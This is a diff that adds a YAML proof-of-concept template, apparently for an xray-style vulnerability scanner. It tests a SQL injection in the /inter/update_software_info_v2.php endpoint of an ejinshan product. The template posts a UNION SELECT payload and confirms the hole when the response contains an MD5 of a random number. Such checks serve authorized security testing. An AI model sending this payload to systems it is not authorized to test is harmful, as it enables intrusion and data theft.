@@ -1,0 +1,22 @@
+name: yaml-poc-ejinshan-zdv9-sql_injection-CT-926438
+binding: 33a15dd1-2e31-4cca-90d3-5428f3cb801c
+detail:
+    author: xiao.xiao
+    vulnerability:
+        id: e6d08524-e16b-47e5-b2b1-dd8f69f37bf3
+        level: critical
+    warning: Harmless
+transport: http
+set:
+    s1: string(randomInt(10000000, 99999999))
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /inter/update_software_info_v2.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: type=-100+UNION+SELECT+1,md5({{s1}}),3,4,5,6,7,8--&key=&pageCount=0&curPage=
+        expression: response.body_string.contains(md5(s1))
+expression: r0()
